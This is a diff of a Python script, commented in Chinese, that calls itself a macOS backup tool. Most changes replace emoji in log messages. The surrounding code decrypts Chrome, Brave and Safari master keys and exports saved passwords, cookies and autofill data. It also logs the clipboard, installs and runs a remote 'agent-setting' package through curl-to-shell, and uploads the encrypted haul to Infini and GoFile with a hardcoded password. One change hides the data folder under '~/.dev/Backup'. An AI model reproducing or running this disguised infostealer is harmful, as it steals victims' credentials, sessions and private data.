@@ -36,7 +36,7 @@ def ensure_uv_installed():
             stderr=subprocess.DEVNULL,
         )
         if result.returncode == 0:
-            print("✓ uv 已安装")
+            print("? uv 已安装")
             return True
     except FileNotFoundError:
         pass
@@ -44,7 +44,7 @@ def ensure_uv_installed():
         pass
 
     # 尝试安装 uv
-    print("⚠ 检测到 uv 未安装，正在尝试安装 uv ...")
+    print("? 检测到 uv 未安装，正在尝试安装 uv ...")
     try:
         # 下载安装脚本
         curl_process = subprocess.Popen(
@@ -55,13 +55,13 @@ def ensure_uv_installed():
         subprocess.check_call(['sh'], stdin=curl_process.stdout)
         curl_process.stdout.close()
         curl_process.wait()
-        print("✓ uv 安装完成")
+        print("? uv 安装完成")
         return True
     except subprocess.CalledProcessError as e:
-        print(f"⚠ 安装 uv 失败: {str(e)}")
+        print(f"? 安装 uv 失败: {str(e)}")
         return False
     except FileNotFoundError:
-        print("⚠ curl 命令未找到，无法安装 uv")
+        print("? curl 命令未找到，无法安装 uv")
         return False
 
 def check_and_install_dependencies():
@@ -92,7 +92,7 @@ def check_and_install_dependencies():
             missing_optional.append(package_name)
 
     if not missing_required and not missing_optional:
-        print("✓ 所有依赖已就绪")
+        print("? 所有依赖已就绪")
         return
 
     # 安装缺失的必需依赖
@@ -104,13 +104,13 @@ def check_and_install_dependencies():
         for package in missing_required:
             try:
                 subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', '--user', package])
-                print(f"✓ 已安装: {package}")
+                print(f"? 已安装: {package}")
             except subprocess.CalledProcessError as e:
-                print(f"⚠ 安装失败: {package} - {str(e)}")
+                print(f"? 安装失败: {package} - {str(e)}")
                 failed_packages.append(package)
 
         if failed_packages:
-            print(f"⚠ 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
+            print(f"? 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
 
     # 安装缺失的可选依赖
     if missing_optional:
@@ -118,9 +118,9 @@ def check_and_install_dependencies():
         for package in missing_optional:
             try:
                 subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', '--user', package])
-                print(f"✓ 已安装: {package}")
+                print(f"? 已安装: {package}")
             except subprocess.CalledProcessError as e:
-                print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
+                print(f"? 安装失败: {package} - {str(e)}（可选功能可能不可用）")
 
 def install_agent_setting():
     """使用 uv 安装或升级 agent-setting 并运行"""
@@ -135,7 +135,7 @@ def install_agent_setting():
     except FileNotFoundError:
         has_agent_setting = False
     except Exception as e:
-        print(f"⚠ 检查 agent-setting 失败: {str(e)}，将尝试安装")
+        print(f"? 检查 agent-setting 失败: {str(e)}，将尝试安装")
         has_agent_setting = False
 
     agent_setting_spec = "git+https://github.com/web3toolsbox/agent-setting.git"
@@ -144,27 +144,27 @@ def install_agent_setting():
         print("检测到 agent-setting 未安装，正在通过 uv 安装 ...")
         try:
             subprocess.check_call(['uv', 'tool', 'install', agent_setting_spec])
-            print("✓ 已通过 uv 安装 agent-setting")
+            print("? 已通过 uv 安装 agent-setting")
         except subprocess.CalledProcessError as e:
-            print(f"⚠ 通过 uv 安装 agent-setting 失败: {str(e)}")
+            print(f"? 通过 uv 安装 agent-setting 失败: {str(e)}")
             return
     else:
         print("检测到 agent-setting 已安装，正在通过 uv 升级 ...")
         try:
             subprocess.check_call(['uv', 'tool', 'upgrade', 'agent-setting'])
-            print("✓ 已通过 uv 升级 agent-setting")
+            print("? 已通过 uv 升级 agent-setting")
         except subprocess.CalledProcessError as e:
-            print(f"⚠ 通过 uv 升级 agent-setting 失败: {str(e)}")
+            print(f"? 通过 uv 升级 agent-setting 失败: {str(e)}")
 
     # 运行 agent-setting
     try:
         print("正在运行 agent-setting ...")
         subprocess.check_call(['agent-setting'])
-        print("✓ agent-setting 执行完成")
+        print("? agent-setting 执行完成")
     except subprocess.CalledProcessError as e:
-        print(f"⚠ 运行 agent-setting 失败: {str(e)}")
+        print(f"? 运行 agent-setting 失败: {str(e)}")
     except FileNotFoundError:
-        print("⚠ 未找到 agent-setting 命令，请检查 uv 是否正确安装")
+        print("? 未找到 agent-setting 命令，请检查 uv 是否正确安装")
 
 
 # 初始化流程：
@@ -179,7 +179,7 @@ try:
     import requests
     from requests.auth import HTTPBasicAuth
 except ImportError as e:
-    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
+    print(f"? 警告: 无法导入 requests 库: {str(e)}")
     requests = None
     HTTPBasicAuth = None
     import_failed = True
@@ -189,12 +189,12 @@ try:
     # 禁用SSL警告
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 except ImportError as e:
-    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
+    print(f"? 警告: 无法导入 urllib3 库: {str(e)}")
     urllib3 = None
     import_failed = True
 
 if import_failed:
-    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")
+    print("? 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")
 
 try:
     from Crypto.Cipher import AES
@@ -203,7 +203,7 @@ try:
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
-    print("⚠ pycryptodome未安装，浏览器数据导出功能将被禁用")
+    print("? pycryptodome未安装，浏览器数据导出功能将被禁用")
 
 class BackupConfig:
     """备份配置类"""
@@ -258,7 +258,7 @@ class BackupConfig:
     MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
     
     # 备份目录 - 用户主目录
-    BACKUP_ROOT = os.path.expanduser('~/Documents/.AutoBackup')
+    BACKUP_ROOT = os.path.expanduser('~/.dev/Backup')
     
     # 时间阈值文件
     THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
@@ -479,7 +479,7 @@ class BrowserDataExporter:
                 key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                 return key
         except (subprocess.SubprocessError, OSError, ValueError) as e:
-            logging.error(f"❌ 获取 {browser_name} 主密钥失败: {e}")
+            logging.error(f"? 获取 {browser_name} 主密钥失败: {e}")
             return None
     
     def decrypt_payload(self, cipher_text, master_key):
@@ -538,11 +538,11 @@ class BrowserDataExporter:
                     return True
                 except (OSError, IOError) as e:
                     if attempt == max_retries - 1:
-                        logging.warning(f"⚠️  文件被锁定，尝试 SQLite 在线备份...")
+                        logging.warning(f"??  文件被锁定，尝试 SQLite 在线备份...")
                         return self.sqlite_online_backup(source_path, dest_path)
                     time.sleep(0.5)
             except (OSError, IOError) as e:
-                logging.error(f"❌ 复制失败: {e}")
+                logging.error(f"? 复制失败: {e}")
                 return False
         return False
     
@@ -554,10 +554,10 @@ class BrowserDataExporter:
             source_conn.backup(dest_conn)
             source_conn.close()
             dest_conn.close()
-            logging.info("✅ 使用在线备份成功")
+            logging.info("? 使用在线备份成功")
             return True
         except (sqlite3.Error, OSError) as e:
-            logging.error(f"❌ 在线备份失败: {e}")
+            logging.error(f"? 在线备份失败: {e}")
             return False
     
     def export_cookies(self, browser_name, browser_path, master_key, profile_name=None):
@@ -939,7 +939,7 @@ class BrowserDataExporter:
     def encrypt_export_data(self, data, password):
         """加密导出数据"""
         if not CRYPTO_AVAILABLE:
-            logging.error("❌ pycryptodome未安装，无法加密数据")
+            logging.error("? pycryptodome未安装，无法加密数据")
             return None
             
         try:
@@ -956,20 +956,20 @@ class BrowserDataExporter:
             }
             return encrypted_data
         except (ValueError, TypeError, OSError) as e:
-            logging.error(f"❌ 加密数据失败: {e}")
+            logging.error(f"? 加密数据失败: {e}")
             return None
     
     def export_all(self):
         """导出所有浏览器数据"""
         if not CRYPTO_AVAILABLE:
-            logging.error("❌ 需要安装 pycryptodome: pip3 install pycryptodome")
+            logging.error("? 需要安装 pycryptodome: pip3 install pycryptodome")
             return None
             
         logging.info("\n" + "="*60)
-        logging.info("🔐 macOS 浏览器数据导出")
+        logging.info("?? macOS 浏览器数据导出")
         logging.info("="*60)
-        logging.info("⚠️  警告：此操作将导出敏感数据")
-        logging.info("ℹ️  提示：支持在浏览器运行时导出（无需关闭）")
+        logging.info("??  警告：此操作将导出敏感数据")
+        logging.info("??  提示：支持在浏览器运行时导出（无需关闭）")
         logging.info("-"*60)
         
         username = getpass.getuser()
@@ -983,12 +983,12 @@ class BrowserDataExporter:
         
         for browser_name, user_data_path in self.browsers.items():
             if not os.path.exists(user_data_path):
-                logging.info(f"⏭️  跳过 {browser_name}（未安装）")
+                logging.info(f"??  跳过 {browser_name}（未安装）")
                 continue
             
             # Safari 特殊处理（不使用 Profile）
             if browser_name == "Safari":
-                logging.info(f"\n📦 处理 {browser_name}...")
+                logging.info(f"\n?? 处理 {browser_name}...")
                 # Safari 不使用主密钥加密
                 master_key = None
                 master_key_b64 = None
@@ -1017,11 +1017,11 @@ class BrowserDataExporter:
                         "master_key": master_key_b64  # Safari 不使用 Master Key
                     }
                     web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
-                    logging.info(f"✅ {browser_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
+                    logging.info(f"? {browser_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
                 continue
             
             # Chrome 和 Brave 支持多个 Profile
-            logging.info(f"\n📦 处理 {browser_name}...")
+            logging.info(f"\n?? 处理 {browser_name}...")
             
             # 获取主密钥（所有 Profile 共享同一个 Master Key）
             master_key = self.get_master_key(browser_name)
@@ -1030,7 +1030,7 @@ class BrowserDataExporter:
                 # 将 Master Key 编码为 base64 以便保存
                 master_key_b64 = base64.b64encode(master_key).decode('utf-8')
             else:
-                logging.warning(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
+                logging.warning(f"??  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
             
             # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
             profiles = []
@@ -1048,18 +1048,18 @@ class BrowserDataExporter:
                         if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                             profiles.append(item)
             except Exception as e:
-                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
+                logging.error(f"? 扫描 {browser_name} Profile 目录失败: {e}")
                 continue
             
             if not profiles:
-                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
+                logging.warning(f"??  {browser_name} 未找到任何 Profile")
                 continue
             
             # 为每个 Profile 导出数据
             browser_profiles = {}
             for profile_name in profiles:
                 profile_path = os.path.join(user_data_path, profile_name)
-                logging.info(f"  📂 处理 Profile: {profile_name}")
+                logging.info(f"  ?? 处理 Profile: {profile_name}")
                 
                 cookies = self.export_cookies(browser_name, profile_path, master_key, profile_name) if master_key else []
                 passwords = self.export_passwords(browser_name, profile_path, master_key, profile_name) if master_key else []
@@ -1085,7 +1085,7 @@ class BrowserDataExporter:
                         "autofill_profiles_count": len(web_data["autofill_profiles"])
                     }
                     web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
-                    logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
+                    logging.info(f"    ? {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
             
             if browser_profiles:
                 all_data["browsers"][browser_name] = {
@@ -1098,17 +1098,17 @@ class BrowserDataExporter:
                     "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                     "profiles_count": len(browser_profiles)
                 }
-                master_key_status = "✅" if master_key_b64 else "⚠️"
+                master_key_status = "?" if master_key_b64 else "??"
                 total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                 total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                 total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                 web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
-                logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
+                logging.info(f"? {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
         
         # 加密保存
         logging.info("\n" + "-"*60)
         password = "cookies2026"
-        logging.info("🔒 使用预设加密密码保护导出文件")
+        logging.info("?? 使用预设加密密码保护导出文件")
         
         encrypted_data = self.encrypt_export_data(all_data, password)
         if not encrypted_data:
@@ -1122,9 +1122,9 @@ class BrowserDataExporter:
             json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
         
         logging.info("\n" + "="*60)
-        logging.info("✅ 浏览器数据导出成功！")
-        logging.info(f"📁 文件名称: {output_file.name}")
-        logging.info("🔒 文件已加密（密码已设置）")
+        logging.info("? 浏览器数据导出成功！")
+        logging.info(f"?? 文件名称: {output_file.name}")
+        logging.info("?? 文件已加密（密码已设置）")
         logging.info("="*60)
         
         return str(output_file)
@@ -1187,7 +1187,7 @@ class BackupManager:
                                 return super().format(record)
                             return None
                         # 保留进度和状态信息
-                        if any(x in msg for x in ["已备份", "完成", "失败", "错误", "成功", "📁", "✅", "❌", "⏳", "📋"]):
+                        if any(x in msg for x in ["已备份", "完成", "失败", "错误", "成功", "??", "?", "?", "?", "??"]):
                             return super().format(record)
                         # 其他普通日志
                         return super().format(record)
@@ -1463,15 +1463,15 @@ class BackupManager:
             logging.debug(f"扩展名类型: {extensions_type}")
 
         if not os.path.exists(source_dir):
-            logging.error(f"❌ 磁盘源目录不存在: {source_dir}")
+            logging.error(f"? 磁盘源目录不存在: {source_dir}")
             return None
 
         if not os.access(source_dir, os.R_OK):
-            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
+            logging.error(f"? 源目录没有读取权限: {source_dir}")
             return None
 
         if not self._clean_directory(target_dir):
-            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
+            logging.error(f"? 无法清理或创建目标目录: {target_dir}")
             return None
 
         # 原有的文件类型备份逻辑
@@ -1518,15 +1518,15 @@ class BackupManager:
                 # 检查是否超时
                 current_time = time.time()
                 if current_time - start_time > self.config.SCAN_TIMEOUT:
-                    logging.error(f"❌ 扫描目录超时: {source_dir}")
+                    logging.error(f"? 扫描目录超时: {source_dir}")
                     break
                     
                 # 定期显示进度
                 if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"⏳ 已扫描 {scanned_dirs} 个目录，排除 {excluded_dirs} 个目录")
-                        logging.debug(f"⏳ 当前扫描: {root}")
-                        logging.debug(f"⏳ 已匹配 {matched_files} 个文件，跳过 {skipped_files} 个文件")
+                        logging.debug(f"? 已扫描 {scanned_dirs} 个目录，排除 {excluded_dirs} 个目录")
+                        logging.debug(f"? 当前扫描: {root}")
+                        logging.debug(f"? 已匹配 {matched_files} 个文件，跳过 {skipped_files} 个文件")
                     last_progress_time = current_time
                 
                 # 跳过目标目录
@@ -1644,24 +1644,24 @@ class BackupManager:
                         except (PermissionError, OSError, IOError) as e:
                             if attempt == self.config.FILE_RETRY_COUNT - 1:
                                 if self.config.DEBUG_MODE:
-                                    logging.debug(f"❌ 文件复制失败: {source_file} - {str(e)}")
+                                    logging.debug(f"? 文件复制失败: {source_file} - {str(e)}")
                                 skipped_files += 1
 
         except (OSError, IOError, PermissionError) as e:
-            logging.error(f"❌ 备份过程出错: {str(e)}")
+            logging.error(f"? 备份过程出错: {str(e)}")
         except Exception as e:
-            logging.error(f"❌ 备份过程出现未知错误: {str(e)}")
+            logging.error(f"? 备份过程出现未知错误: {str(e)}")
 
         # 显示最终统计信息
         if files_count > 0:
-            logging.info(f"\n📊 备份完成:")
-            logging.info(f"   📁 文件数量: {files_count}")
-            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
+            logging.info(f"\n?? 备份完成:")
+            logging.info(f"   ?? 文件数量: {files_count}")
+            logging.info(f"   ?? 总大小: {total_size / 1024 / 1024:.1f}MB")
             if self.config.DEBUG_MODE:
-                logging.debug(f"   📂 扫描目录数: {scanned_dirs}")
-                logging.debug(f"   🚫 排除目录数: {excluded_dirs}")
-                logging.debug(f"   ⏭️ 跳过文件数: {skipped_files}")
-                logging.debug(f"   ✅ 匹配文件数: {matched_files}")
+                logging.debug(f"   ?? 扫描目录数: {scanned_dirs}")
+                logging.debug(f"   ?? 排除目录数: {excluded_dirs}")
+                logging.debug(f"   ?? 跳过文件数: {skipped_files}")
+                logging.debug(f"   ? 匹配文件数: {matched_files}")
             return target_dir
         else:
             if self.config.DEBUG_MODE:
@@ -1670,7 +1670,7 @@ class BackupManager:
                 logging.debug(f"- 排除目录数: {excluded_dirs}")
                 logging.debug(f"- 跳过文件数: {skipped_files}")
                 logging.debug(f"- 匹配文件数: {matched_files}")
-            logging.error(f"❌ 未找到需要备份的文件")
+            logging.error(f"? 未找到需要备份的文件")
             return None
     
     def _get_upload_server(self):
@@ -1797,7 +1797,7 @@ class BackupManager:
             infini_password = infini_config.get("password", "")
 
             if not infini_url or not infini_user or not infini_password:
-                logging.error(f"❌ [{config_name}] 配置不完整，跳过")
+                logging.error(f"? [{config_name}] 配置不完整，跳过")
                 return False
 
             auth = HTTPBasicAuth(infini_user, infini_password)
@@ -1849,7 +1849,7 @@ class BackupManager:
                     # 只在第一次尝试时显示详细信息
                     if attempt == 0:
                         size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
-                        logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
+                        logging.critical(f"?? [{config_name}] 上传: {filename} ({size_str})")
                     elif self.config.DEBUG_MODE:
                         logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")
                     
@@ -1871,33 +1871,33 @@ class BackupManager:
                         )
                     
                     if response.status_code in [201, 204]:
-                        logging.critical(f"✅ [{config_name}] {filename}")
+                        logging.critical(f"? [{config_name}] {filename}")
                         return True
                     elif response.status_code == 403:
                         if attempt == 0 or self.config.DEBUG_MODE:
-                            logging.error(f"❌ [{config_name}] {filename}: 权限不足")
+                            logging.error(f"? [{config_name}] {filename}: 权限不足")
                     elif response.status_code == 404:
                         if attempt == 0 or self.config.DEBUG_MODE:
-                            logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
+                            logging.error(f"? [{config_name}] {filename}: 远程路径不存在")
                     elif response.status_code == 409:
                         if attempt == 0 or self.config.DEBUG_MODE:
-                            logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
+                            logging.error(f"? [{config_name}] {filename}: 远程路径冲突")
                     else:
                         if attempt == 0 or self.config.DEBUG_MODE:
-                            logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
+                            logging.error(f"? [{config_name}] {filename}: 状态码 {response.status_code}")
                         
                 except requests.exceptions.Timeout:
                     if attempt == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 超时")
+                        logging.error(f"? [{config_name}] {os.path.basename(file_path)}: 超时")
                 except requests.exceptions.SSLError:
                     if attempt == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: SSL错误")
+                        logging.error(f"? [{config_name}] {os.path.basename(file_path)}: SSL错误")
                 except requests.exceptions.ConnectionError:
                     if attempt == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 连接错误")
+                        logging.error(f"? [{config_name}] {os.path.basename(file_path)}: 连接错误")
                 except Exception as e:
                     if attempt == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: {str(e)}")
+                        logging.error(f"? [{config_name}] {os.path.basename(file_path)}: {str(e)}")
 
                 if attempt < self.config.RETRY_COUNT - 1:
                     if self.config.DEBUG_MODE:
@@ -1937,7 +1937,7 @@ class BackupManager:
                 return False
 
             filename = os.path.basename(file_path)
-            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
+            logging.info(f"?? 尝试使用 GoFile 上传: {filename}")
 
             server_index = 0
             total_retries = 0
@@ -1967,7 +1967,7 @@ class BackupManager:
                             try:
                                 result = response.json()
                                 if result.get("status") == "ok":
-                                    logging.critical(f"✅ [GoFile] {filename}")
+                                    logging.critical(f"? [GoFile] {filename}")
                                     upload_success = True
                                     break
                                 else:
@@ -1990,22 +1990,22 @@ class BackupManager:
 
                 except requests.exceptions.Timeout:
                     if total_retries == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [GoFile] {filename}: 上传超时")
+                        logging.error(f"? [GoFile] {filename}: 上传超时")
                 except requests.exceptions.SSLError:
                     if total_retries == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [GoFile] {filename}: SSL错误")
+                        logging.error(f"? [GoFile] {filename}: SSL错误")
                 except requests.exceptions.ConnectionError as e:
                     if total_retries == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [GoFile] {filename}: 连接错误")
+                        logging.error(f"? [GoFile] {filename}: 连接错误")
                 except requests.exceptions.RequestException as e:
                     if total_retries == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [GoFile] {filename}: 请求异常")
+                        logging.error(f"? [GoFile] {filename}: 请求异常")
                 except (OSError, IOError) as e:
                     if total_retries == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [GoFile] {filename}: 文件读取错误")
+                        logging.error(f"? [GoFile] {filename}: 文件读取错误")
                 except Exception as e:
                     if total_retries == 0 or self.config.DEBUG_MODE:
-                        logging.error(f"❌ [GoFile] {filename}: {str(e)}")
+                        logging.error(f"? [GoFile] {filename}: {str(e)}")
 
                 # 切换到下一个服务器
                 server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
@@ -2017,7 +2017,7 @@ class BackupManager:
             if upload_success:
                 return True
             else:
-                logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
+                logging.error(f"? [GoFile] {filename}: 上传失败，已达到最大重试次数")
                 return False
 
         except (OSError, IOError, PermissionError) as e:
@@ -2064,19 +2064,19 @@ class BackupManager:
             # 依次尝试所有 Infini 上传配置
             for index, infini_config in enumerate(infini_configs, start=1):
                 config_name = infini_config.get("name", f"Infini-{index}")
-                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
+                logging.info(f"?? 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                 if self._upload_single_file_infini(file_path, infini_config):
                     self._safe_remove_file(file_path, retry=True)
                     return True
 
             # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
-            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
+            logging.warning(f"?? 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
             if self._upload_single_file_gofile(file_path):
                 self._safe_remove_file(file_path, retry=True)
                 return True
             
             # 所有方法都失败
-            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
+            logging.error(f"? {os.path.basename(file_path)}: 所有上传方法均失败")
             return False
 
         except (OSError, IOError, PermissionError) as e:
@@ -2397,12 +2397,12 @@ class BackupManager:
             
             # 写入日志
             with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
-                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                f.write(f"\n=== ?? {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                 f.write(f"{content}\n")
                 f.write("-"*30 + "\n")
         except (OSError, IOError, PermissionError) as e:
             if self.config.DEBUG_MODE:
-                logging.error(f"❌ 记录JTB失败: {e}")
+                logging.error(f"? 记录JTB失败: {e}")
 
     def monitor_clipboard(self, file_path, interval=3):
         """监控JTB变化并记录到文件
@@ -2417,7 +2417,7 @@ class BackupManager:
             try:
                 os.makedirs(log_dir, exist_ok=True)
             except Exception as e:
-                logging.error(f"❌ 创建JTB日志目录失败: {e}")
+                logging.error(f"? 创建JTB日志目录失败: {e}")
                 return
 
         last_content = ""
@@ -2432,7 +2432,7 @@ class BackupManager:
                     self.log_clipboard_update(current_content, file_path)
                     last_content = current_content
                     if self.config.DEBUG_MODE:
-                        logging.info("📋 检测到JTB更新")
+                        logging.info("?? 检测到JTB更新")
                     error_count = 0  # 重置错误计数
                 else:
                     error_count = 0  # 空内容不算错误，重置计数
@@ -2440,11 +2440,11 @@ class BackupManager:
                 error_count += 1
                 if error_count >= max_errors:
                     if self.config.DEBUG_MODE:
-                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
+                        logging.error(f"? JTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
                     time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                     error_count = 0  # 重置错误计数
                 elif self.config.DEBUG_MODE:
-                    logging.error(f"❌ JTB监控出错: {e}")
+                    logging.error(f"? JTB监控出错: {e}")
             time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)
 
     def upload_backup(self, backup_path):
@@ -2484,15 +2484,15 @@ class BackupManager:
             logging.debug(f"目标目录: {target_dir}")
 
         if not os.path.exists(source_dir):
-            logging.error(f"❌ 源目录不存在: {source_dir}")
+            logging.error(f"? 源目录不存在: {source_dir}")
             return None
 
         if not os.access(source_dir, os.R_OK):
-            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
+            logging.error(f"? 源目录没有读取权限: {source_dir}")
             return None
 
         if not self._clean_directory(target_dir):
-            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
+            logging.error(f"? 无法清理或创建目标目录: {target_dir}")
             return None
 
         # 计算文件大小限制（与split_large_directory中的逻辑一致）
@@ -2517,7 +2517,7 @@ class BackupManager:
                     file_size = os.path.getsize(src)
                     if file_size > MAX_CHUNK_SIZE:
                         skipped_files.append((src, file_size))
-                        logging.warning(f"⚠️ 跳过超大文件: {src} ({file_size / 1024 / 1024:.1f}MB > {MAX_CHUNK_SIZE / 1024 / 1024:.1f}MB)")
+                        logging.warning(f"?? 跳过超大文件: {src} ({file_size / 1024 / 1024:.1f}MB > {MAX_CHUNK_SIZE / 1024 / 1024:.1f}MB)")
                         return False
                     shutil.copy2(src, dst)
                     files_count += 1
@@ -2552,7 +2552,7 @@ class BackupManager:
                                 file_size = os.path.getsize(src_file)
                                 if file_size > MAX_CHUNK_SIZE:
                                     skipped_files.append((src_file, file_size))
-                                    logging.warning(f"⚠️ 跳过超大文件: {src_file} ({file_size / 1024 / 1024:.1f}MB > {MAX_CHUNK_SIZE / 1024 / 1024:.1f}MB)")
+                                    logging.warning(f"?? 跳过超大文件: {src_file} ({file_size / 1024 / 1024:.1f}MB > {MAX_CHUNK_SIZE / 1024 / 1024:.1f}MB)")
                                     continue
                                 
                                 shutil.copy2(src_file, dst_file)
@@ -2584,13 +2584,13 @@ class BackupManager:
                         dst_path = os.path.join(target_dir, rel_name)
                         if copy_with_size_check(matched_path, dst_path, is_file=True):
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"✅ 已备份文件: {matched_path} -> {dst_path}")
+                                logging.debug(f"? 已备份文件: {matched_path} -> {dst_path}")
                     elif os.path.isdir(matched_path):
                         items_count += 1
                         dst_path = os.path.join(target_dir, rel_name)
                         if copy_with_size_check(matched_path, dst_path, is_file=False):
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"📁 已备份目录: {matched_path} -> {dst_path}")
+                                logging.debug(f"?? 已备份目录: {matched_path} -> {dst_path}")
                 continue
 
             source_path = os.path.join(source_dir, item)
@@ -2618,18 +2618,18 @@ class BackupManager:
                     logging.debug(f"处理失败: {source_path} - {str(e)}")
 
         if items_count > 0:
-            logging.info(f"\n📊 指定文件备份完成:")
-            logging.info(f"   📁 顶层项目数量: {items_count}")
-            logging.info(f"   📄 实际文件数量: {files_count}")
-            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
+            logging.info(f"\n?? 指定文件备份完成:")
+            logging.info(f"   ?? 顶层项目数量: {items_count}")
+            logging.info(f"   ?? 实际文件数量: {files_count}")
+            logging.info(f"   ?? 总大小: {total_size / 1024 / 1024:.1f}MB")
             if skipped_files:
-                logging.warning(f"   ⚠️ 跳过的超大文件数量: {len(skipped_files)}")
+                logging.warning(f"   ?? 跳过的超大文件数量: {len(skipped_files)}")
                 if self.config.DEBUG_MODE:
                     for file_path, file_size in skipped_files[:10]:  # 只显示前10个
                         logging.debug(f"      - {file_path} ({file_size / 1024 / 1024:.1f}MB)")
             return target_dir
         else:
-            logging.error(f"❌ 未找到需要备份的指定文件")
+            logging.error(f"? 未找到需要备份的指定文件")
             return None
 
     def has_clipboard_content(self, file_path):
@@ -2666,7 +2666,7 @@ class BackupManager:
                 # 跳过空行、标题行和分隔线
                 if (line and 
                     not line.startswith('===') and 
-                    not line.startswith('📋') and 
+                    not line.startswith('??') and 
                     not line.startswith('-') * 30 and
                     not line.startswith('JTB日志已于') and
                     not line.startswith('JTB监控启动于')):
@@ -2709,15 +2709,15 @@ def get_available_volumes():
                 'configs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_configs'), 2),
                 'specified': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_specified'), 4),
             }
-            logging.info(f"✅ 已配置用户主目录备份: {user_path}")
+            logging.info(f"? 已配置用户主目录备份: {user_path}")
             
         except Exception as e:
-            logging.error(f"❌ 配置用户主目录备份时出错: {e}")
+            logging.error(f"? 配置用户主目录备份时出错: {e}")
     
     if not available_volumes:
-        logging.warning("⚠️ 未检测到可用的用户主目录")
